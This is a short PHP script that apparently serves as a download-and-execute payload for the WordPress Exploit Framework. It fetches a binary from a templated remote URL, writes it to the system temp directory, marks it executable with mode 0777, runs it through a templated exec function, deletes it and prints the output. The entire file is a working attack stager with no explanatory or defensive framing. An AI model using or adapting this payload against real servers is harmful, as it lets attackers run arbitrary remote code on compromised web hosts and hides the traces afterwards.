<?php
  if (!function_exists('sys_get_temp_dir')) {
    function sys_get_temp_dir() {
      if (!empty($_ENV['TMP'])) { return realpath($_ENV['TMP']); }
      if (!empty($_ENV['TMPDIR'])) { return realpath($_ENV['TMPDIR']); }
      if (!empty($_ENV['TEMP'])) { return realpath($_ENV['TEMP']); }

      $tempfile = tempnam(uniqid(rand(), TRUE),'');

      if (file_exists($tempfile)) {
        @unlink($tempfile);
        return realpath(dirname($tempfile));
      }

      return null;
    }
  }

  $fname = sys_get_temp_dir() . DIRECTORY_SEPARATOR . $exename;
  $fd_in = fopen($executable_url, "rb");
  $fd_out = fopen($fname, "wb");

  while (!feof($fd_in)) {
    fwrite($fd_out, fread($fd_in, 8192));
  }

  fclose($fd_in);
  fclose($fd_out);
  chmod($fname, 0777);

  $cmd = $fname;
  $output = $wpxf_exec($cmd);

  @unlink($fname);
  echo $output;
?>
